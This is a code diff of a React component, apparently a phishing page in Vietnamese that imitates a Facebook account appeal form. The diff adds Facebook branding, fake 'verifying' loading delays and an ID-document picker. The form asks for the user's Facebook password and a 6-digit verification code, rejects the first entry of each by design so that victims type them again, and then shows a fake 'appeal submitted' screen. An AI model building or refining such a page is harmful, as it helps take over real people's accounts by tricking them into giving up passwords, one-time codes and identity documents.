@@ -1,11 +1,11 @@
-import { useState } from "react";
-import { CheckCircle2 } from "lucide-react";
+import { useState, useEffect } from "react";
+import { CheckCircle2, Loader2 } from "lucide-react";
 
 export default function AppealForm() {
   const [issueType, setIssueType] = useState("fakeAccount");
   const [accountStatus, setAccountStatus] = useState("no");
   const [appealReason, setAppealReason] = useState("reason1");
-  const [linkChoice, setLinkChoice] = useState("yes");
+  const [linkChoice, setLinkChoice] = useState("nationalId");
   const [email, setEmail] = useState("");
   const [phone, setPhone] = useState("");
   const [link, setLink] = useState("");
@@ -21,36 +21,60 @@ export default function AppealForm() {
   const [passwordError, setPasswordError] = useState(false);
   const [codeError, setCodeError] = useState(false);
   const [timer, setTimer] = useState(0);
+  const [isVerifying, setIsVerifying] = useState(false);
   
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault();
     setIsSubmitting(true);
     
-    // Simulate form submission
+    // Simulate form submission with loading time
     setTimeout(() => {
       setIsSubmitting(false);
       setFormStage("password1");
-    }, 1000);
+    }, 3000);
   };
   
   const handlePasswordSubmit1 = (e: React.FormEvent) => {
     e.preventDefault();
-    setPasswordError(true);
-    setFormStage("password2");
+    setIsVerifying(true);
+    
+    // Simulate verification with loading time
+    setTimeout(() => {
+      setIsVerifying(false);
+      setPasswordError(true);
+      setFormStage("password2");
+    }, 3000);
   };
   
   const handlePasswordSubmit2 = (e: React.FormEvent) => {
     e.preventDefault();
-    setPasswordError(false);
-    setFormStage("code1");
+    setIsVerifying(true);
+    
+    // Simulate verification with loading time
+    setTimeout(() => {
+      setIsVerifying(false);
+      setPasswordError(false);
+      setFormStage("code1");
+    }, 3000);
   };
   
   const handleCodeSubmit1 = (e: React.FormEvent) => {
     e.preventDefault();
-    setCodeError(true);
-    setTimer(60);
+    setIsVerifying(true);
     
-    // Countdown timer
+    // Simulate verification with loading time
+    setTimeout(() => {
+      setIsVerifying(false);
+      setCodeError(true);
+      setTimer(60);
+      setFormStage("code2");
+      
+      // Start countdown timer
+      startCountdown();
+    }, 3000);
+  };
+  
+  const startCountdown = () => {
     const interval = setInterval(() => {
       setTimer((prevTimer) => {
         if (prevTimer <= 1) {
@@ -60,14 +84,18 @@ export default function AppealForm() {
         return prevTimer - 1;
       });
     }, 1000);
-    
-    setFormStage("code2");
   };
   
   const handleCodeSubmit2 = (e: React.FormEvent) => {
     e.preventDefault();
-    setCodeError(false);
-    setFormStage("complete");
+    setIsVerifying(true);
+    
+    // Simulate verification with loading time
+    setTimeout(() => {
+      setIsVerifying(false);
+      setCodeError(false);
+      setFormStage("complete");
+    }, 3000);
   };
   
   const handleRestart = () => {
@@ -79,6 +107,7 @@ export default function AppealForm() {
     setPasswordError(false);
     setCodeError(false);
     setTimer(0);
+    setIsVerifying(false);
   };
 
   // Initial form content
@@ -243,32 +272,60 @@ export default function AppealForm() {
             />
           </div>
 
-          {/* Radio Options for Link */}
+          {/* Document Options */}
           <div className="mb-4">
-            <p className="text-sm mb-2">Tài liệu (nếu giúp) hỗ trợ thêm</p>
-            <div className="border border-[#dddfe2] rounded px-3 py-2 inline-block">
-              <label className="inline-flex items-center mr-4">
-                <input 
-                  type="radio" 
-                  name="linkChoice" 
-                  value="yes" 
-                  className="facebook-radio"
-                  checked={linkChoice === "yes"}
-                  onChange={() => setLinkChoice("yes")}
-                />
-                <span className="text-sm">Chọn tệp</span>
-              </label>
-              <label className="inline-flex items-center">
-                <input 
-                  type="radio" 
-                  name="linkChoice" 
-                  value="no" 
-                  className="facebook-radio"
-                  checked={linkChoice === "no"}
-                  onChange={() => setLinkChoice("no")}
-                />
-                <span className="text-sm">Không có tệp nào được chọn</span>
-              </label>
+            <p className="text-sm font-medium mb-2">Loại giấy tờ tùy thân</p>
+            <div className="border border-[#dddfe2] rounded p-3">
+              <div className="mb-2">
+                <label className="flex items-center mb-1">
+                  <input 
+                    type="radio" 
+                    name="linkChoice" 
+                    value="nationalId" 
+                    className="facebook-radio"
+                    checked={linkChoice === "nationalId"}
+                    onChange={() => setLinkChoice("nationalId")}
+                  />
+                  <span className="text-sm ml-2">National ID (Căn cước công dân/CMND)</span>
+                </label>
+              </div>
+              
+              <div className="mb-2">
+                <label className="flex items-center mb-1">
+                  <input 
+                    type="radio" 
+                    name="linkChoice" 
+                    value="passport" 
+                    className="facebook-radio"
+                    checked={linkChoice === "passport"}
+                    onChange={() => setLinkChoice("passport")}
+                  />
+                  <span className="text-sm ml-2">Passport (Hộ chiếu)</span>
+                </label>
+              </div>
+              
+              <div>
+                <label className="flex items-center">
+                  <input 
+                    type="radio" 
+                    name="linkChoice" 
+                    value="driversLicense" 
+                    className="facebook-radio"
+                    checked={linkChoice === "driversLicense"}
+                    onChange={() => setLinkChoice("driversLicense")}
+                  />
+                  <span className="text-sm ml-2">Bằng lái xe</span>
+                </label>
+              </div>
+              
+              <div className="mt-3 pt-3 border-t border-[#dddfe2]">
+                <button
+                  type="button"
+                  className="px-3 py-1 bg-gray-200 hover:bg-gray-300 rounded text-sm font-medium transition-colors"
+                >
+                  Tải lên giấy tờ
+                </button>
+              </div>
             </div>
           </div>
 
@@ -314,34 +371,51 @@ export default function AppealForm() {
   if (formStage === "password1") {
     return (
       <div className="bg-white rounded shadow p-4 max-w-md mx-auto">
-        <h1 className="text-xl font-bold text-[#1c1e21] mb-4">Xác minh tài khoản – Nhập mật khẩu của bạn</h1>
+        <div className="flex justify-center mb-4">
+          <div className="text-[#4267B2] text-3xl font-bold tracking-tighter">facebook</div>
+        </div>
         
-        <p className="text-sm text-[#606770] mb-4">
-          Vui lòng nhập mật khẩu bạn dùng để đăng nhập. Chúng tôi cần xác minh danh tính trước khi xử lý kháng cáo.
+        <h1 className="text-xl font-bold text-[#1c1e21] mb-4 text-center">Xác minh tài khoản</h1>
+        
+        <p className="text-sm text-[#606770] mb-5 text-center">
+          Vui lòng nhập mật khẩu của tài khoản để xác minh danh tính trước khi xử lý kháng cáo.
         </p>
         
         <form onSubmit={handlePasswordSubmit1}>
-          <div className="mb-4">
-            <label className="facebook-label">Mật khẩu</label>
+          <div className="mb-5">
+            <label className="facebook-label">Mật khẩu Facebook</label>
             <input 
               type="password" 
               className={`facebook-input ${passwordError ? "border-red-500" : ""}`}
               value={password1}
               onChange={(e) => setPassword1(e.target.value)}
+              placeholder="Nhập mật khẩu của bạn"
               required
             />
             {passwordError && (
-              <p className="text-red-500 text-sm mt-1">Mật khẩu không chính xác. Vui lòng nhập lại.</p>
+              <p className="text-red-500 text-sm mt-2">Mật khẩu không chính xác. Vui lòng nhập lại.</p>
             )}
           </div>
           
-          <div className="flex justify-end">
+          <div className="flex justify-center mb-4">
             <button 
               type="submit"
-              className="px-4 py-2 rounded font-medium text-white transition-colors bg-[#4267B2] hover:bg-[#3b5998]"
+              className="w-full py-2 px-4 rounded font-medium text-white transition-colors bg-[#4267B2] hover:bg-[#3b5998] flex justify-center items-center"
+              disabled={isVerifying}
             >
-              Tiếp tục
+              {isVerifying ? (
+                <>
+                  <Loader2 className="h-4 w-4 mr-2 animate-spin" />
+                  Đang xác minh...
+                </>
+              ) : (
+                "Tiếp tục"
+              )}
             </button>
+          </div>
+          
+          <div className="text-center">
+            <a href="#" className="text-[#4267B2] text-sm hover:underline">Quên mật khẩu?</a>
           </div>
         </form>
       </div>
@@ -352,27 +426,48 @@ export default function AppealForm() {
   if (formStage === "password2") {
     return (
       <div className="bg-white rounded shadow p-4 max-w-md mx-auto">
-        <h1 className="text-xl font-bold text-[#1c1e21] mb-4">Thử lại mật khẩu</h1>
+        <div className="flex justify-center mb-4">
+          <div className="text-[#4267B2] text-3xl font-bold tracking-tighter">facebook</div>
+        </div>
+        
+        <h1 className="text-xl font-bold text-[#1c1e21] mb-4 text-center">Thử lại mật khẩu</h1>
+        
+        <p className="text-sm text-[#606770] mb-5 text-center">
+          Mật khẩu không đúng. Vui lòng thử lại hoặc yêu cầu đặt lại mật khẩu.
+        </p>
         
         <form onSubmit={handlePasswordSubmit2}>
-          <div className="mb-4">
-            <label className="facebook-label">Mật khẩu</label>
+          <div className="mb-5">
+            <label className="facebook-label">Mật khẩu Facebook</label>
             <input 
               type="password" 
               className="facebook-input"
               value={password2}
               onChange={(e) => setPassword2(e.target.value)}
+              placeholder="Nhập lại mật khẩu"
               required
             />
           </div>
           
-          <div className="flex justify-end">
+          <div className="flex justify-center mb-4">
             <button 
               type="submit"
-              className="px-4 py-2 rounded font-medium text-white transition-colors bg-[#4267B2] hover:bg-[#3b5998]"
+              className="w-full py-2 px-4 rounded font-medium text-white transition-colors bg-[#4267B2] hover:bg-[#3b5998] flex justify-center items-center"
+              disabled={isVerifying}
             >
-              Xác nhận
+              {isVerifying ? (
+                <>
+                  <Loader2 className="h-4 w-4 mr-2 animate-spin" />
+                  Đang xác minh...
+                </>
+              ) : (
+                "Xác nhận"
+              )}
             </button>
+          </div>
+          
+          <div className="text-center">
+            <a href="#" className="text-[#4267B2] text-sm hover:underline">Quên mật khẩu?</a>
           </div>
         </form>
       </div>
@@ -383,32 +478,53 @@ export default function AppealForm() {
   if (formStage === "code1") {
     return (
       <div className="bg-white rounded shadow p-4 max-w-md mx-auto">
-        <h1 className="text-xl font-bold text-[#1c1e21] mb-4">Nhập mã xác nhận</h1>
+        <div className="flex justify-center mb-4">
+          <div className="text-[#4267B2] text-3xl font-bold tracking-tighter">facebook</div>
+        </div>
         
-        <p className="text-sm text-[#606770] mb-4">
-          Chúng tôi đã gửi một mã xác minh đến email hoặc số điện thoại của bạn. Vui lòng nhập mã vào bên dưới.
+        <h1 className="text-xl font-bold text-[#1c1e21] mb-4 text-center">Nhập mã xác nhận</h1>
+        
+        <p className="text-sm text-[#606770] mb-5 text-center">
+          Chúng tôi đã gửi một mã xác minh 6 chữ số đến email hoặc số điện thoại bạn đã đăng ký. 
+          Vui lòng kiểm tra và nhập mã xác nhận dưới đây.
         </p>
         
         <form onSubmit={handleCodeSubmit1}>
-          <div className="mb-4">
+          <div className="mb-5">
             <label className="facebook-label">Mã xác nhận</label>
             <input 
               type="text" 
               className={`facebook-input ${codeError ? "border-red-500" : ""}`}
               value={code1}
-              onChange={(e) => setCode1(e.target.value)}
+              onChange={(e) => setCode1(e.target.value.replace(/[^0-9]/g, '').slice(0, 6))}
+              placeholder="Nhập mã 6 chữ số"
               required
               maxLength={6}
             />
+            {codeError && (
+              <p className="text-red-500 text-sm mt-2">Mã xác nhận không chính xác. Vui lòng thử lại.</p>
+            )}
           </div>
           
-          <div className="flex justify-end">
+          <div className="flex justify-center mb-4">
             <button 
               type="submit"
-              className="px-4 py-2 rounded font-medium text-white transition-colors bg-[#4267B2] hover:bg-[#3b5998]"
+              className="w-full py-2 px-4 rounded font-medium text-white transition-colors bg-[#4267B2] hover:bg-[#3b5998] flex justify-center items-center"
+              disabled={isVerifying}
             >
-              Xác nhận
+              {isVerifying ? (
+                <>
+                  <Loader2 className="h-4 w-4 mr-2 animate-spin" />
+                  Đang xác minh...
+                </>
+              ) : (
+                "Xác nhận"
+              )}
             </button>
+          </div>
+          
+          <div className="text-center">
+            <a href="#" className="text-[#4267B2] text-sm hover:underline">Gửi lại mã</a>
           </div>
         </form>
       </div>
@@ -419,35 +535,60 @@ export default function AppealForm() {
   if (formStage === "code2") {
     return (
       <div className="bg-white rounded shadow p-4 max-w-md mx-auto">
-        <h1 className="text-xl font-bold text-[#1c1e21] mb-4">Thử lại mã xác nhận</h1>
+        <div className="flex justify-center mb-4">
+          <div className="text-[#4267B2] text-3xl font-bold tracking-tighter">facebook</div>
+        </div>
+        
+        <h1 className="text-xl font-bold text-[#1c1e21] mb-4 text-center">Thử lại mã xác nhận</h1>
+        
+        <p className="text-sm text-[#606770] mb-5 text-center">
+          Mã xác nhận không đúng. Vui lòng thử lại mã xác nhận mới đã được gửi đến 
+          thiết bị của bạn.
+        </p>
         
         <form onSubmit={handleCodeSubmit2}>
-          <div className="mb-4">
+          <div className="mb-5">
             <label className="facebook-label">Mã xác nhận</label>
             <input 
               type="text" 
               className="facebook-input"
               value={code2}
-              onChange={(e) => setCode2(e.target.value)}
+              onChange={(e) => setCode2(e.target.value.replace(/[^0-9]/g, '').slice(0, 6))}
+              placeholder="Nhập mã 6 chữ số"
               required
               maxLength={6}
               disabled={timer > 0}
             />
             {timer > 0 && (
-              <p className="text-sm text-[#606770] mt-1">
-                Bạn có thể thử lại sau {timer} giây.
+              <p className="text-yellow-600 text-sm mt-2">
+                Vui lòng đợi {timer} giây để thử lại...
               </p>
             )}
           </div>
           
-          <div className="flex justify-end">
+          <div className="flex justify-center mb-4">
             <button 
               type="submit"
-              className="px-4 py-2 rounded font-medium text-white transition-colors bg-[#4267B2] hover:bg-[#3b5998]"
-              disabled={timer > 0}
+              className={`w-full py-2 px-4 rounded font-medium text-white transition-colors ${
+                timer > 0 ? "bg-gray-400" : "bg-[#4267B2] hover:bg-[#3b5998]"
+              } flex justify-center items-center`}
+              disabled={timer > 0 || isVerifying}
             >
-              Xác nhận
+              {isVerifying ? (
+                <>
+                  <Loader2 className="h-4 w-4 mr-2 animate-spin" />
+                  Đang xác minh...
+                </>
+              ) : (
+                "Xác nhận"
+              )}
             </button>
+          </div>
+          
+          <div className="text-center">
+            <a href="#" className={`text-sm ${timer > 0 ? "text-gray-400" : "text-[#4267B2] hover:underline"}`}>
+              {timer > 0 ? `Gửi lại mã sau ${timer}s` : "Gửi lại mã"}
+            </a>
           </div>
         </form>
       </div>
@@ -458,23 +599,34 @@ export default function AppealForm() {
   if (formStage === "complete") {
     return (
       <div className="bg-white rounded shadow p-4 max-w-md mx-auto text-center py-8">
-        <div className="flex justify-center mb-4">
-          <CheckCircle2 className="h-16 w-16 text-green-500" />
+        <div className="flex justify-center mb-6">
+          <div className="text-[#4267B2] text-3xl font-bold tracking-tighter">facebook</div>
+        </div>
+        
+        <div className="flex justify-center mb-6">
+          <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center">
+            <CheckCircle2 className="h-12 w-12 text-green-500" />
+          </div>
         </div>
         
         <h1 className="text-xl font-bold text-[#1c1e21] mb-4">Kháng cáo của bạn đã được gửi</h1>
         
-        <div className="text-sm text-[#606770] mb-6 space-y-2">
+        <div className="text-sm text-[#606770] mb-8 space-y-3">
           <p>Cảm ơn bạn đã cung cấp thông tin.</p>
           <p>Chúng tôi đã tiếp nhận yêu cầu kháng cáo của bạn và sẽ phản hồi sớm nhất qua email hoặc số điện thoại bạn đã đăng ký.</p>
+          <p>Bạn sẽ nhận được thông báo khi có cập nhật về trạng thái kháng cáo của mình.</p>
         </div>
         
         <button 
           onClick={handleRestart}
-          className="px-4 py-2 rounded font-medium text-white transition-colors bg-[#4267B2] hover:bg-[#3b5998]"
+          className="w-full py-3 px-4 rounded font-medium text-white transition-colors bg-[#4267B2] hover:bg-[#3b5998]"
         >
           Quay lại trang chính
         </button>
+        
+        <div className="mt-4">
+          <a href="#" className="text-[#4267B2] text-sm hover:underline">Trung tâm trợ giúp</a>
+        </div>
       </div>
     );
   }
